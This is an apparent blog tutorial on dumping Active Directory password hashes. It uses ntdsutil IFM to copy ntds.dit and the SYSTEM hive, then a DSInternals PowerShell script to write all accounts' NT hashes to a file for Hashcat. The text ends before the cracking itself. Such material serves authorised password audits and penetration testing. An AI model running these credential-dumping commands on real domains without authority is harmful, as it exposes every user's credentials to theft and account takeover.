---
layout: post
title: Cracking Domain Passwords
subtitle: Using Hashcat on Windows
tags: [Penetration Testing, Hashcat]
---

Today, we'll be extracting hashes from a Domain Controller using built in tools and then cracking them using [Hashcat](https://hashcat.net/hashcat/).

{: .box-warning}
**Warning:** This is for educational purposes only. Do not attempt this without explicit permission from the network admin.

First of all, we need to get the hashed from Active Directory. Now, because this blog assumes you have your Network Admin/Security Team, we're going to use a function built right into Windows called 'ntdsutil'. You'll need to create an empty directory for NTDSUtil to dump out what we need.

Open a command prompt as an elevated user and run these commands:

~~~
ntdsutil
active instance ntds
ifm
create full C:\Your\Path\Here
~~~

This may take a minute or two to run. Once it's done, you'll get a message in your command prompt saying "IFM Media created successfully in C:\Your\Path\Here.

You'll now see two folders in your path named "Active Directory" and "registry". I find it easier to raname "Active Directory" to "ActiveDirectory", dropping the space. Now, in the Registry folder, you'll find two registry hives, the one we're interested in is the SYSTEM hive as it contains the key to unlock the Active Directory database. In the Active Directory folder, you'll find said database called "ntds.dit".

Next, we need to extract all of the hashes from ntds.dit; there are many methods of doing this but I prefer to use PowerShell scripts from DSInternals. You'll need to download and import their modules from [here](https://www.dsinternals.com/en/downloads/).

Once you've downloaded and stored the DSInternals module in your PowerShell directory, we can use it to extract the hashes. Below is the script I use to do this:

~~~
# Import DSInternal Module
Import-Module DSInternals

# Get SYSTEM hive key
$key = Get-BootKey -SystemHivePath "C:\Your\Path\Here\registry\SYSTEM"

# Dump NT hashes in the format understood by Hashcat:
Get-ADDBAccount -All -DBPath "C:\Your\Path\Here\ActiveDirectory\ntds.dit" -BootKey $key |
   Format-Custom -View HashcatNT |
   Out-File C:\Output\File\Path\Hashes.txt -Encoding ASCII
~~~

Once executed, you'll find a text file named Hashes.txt in our Output File Path (in the format of username:hash), you're now ready for Hashcat!

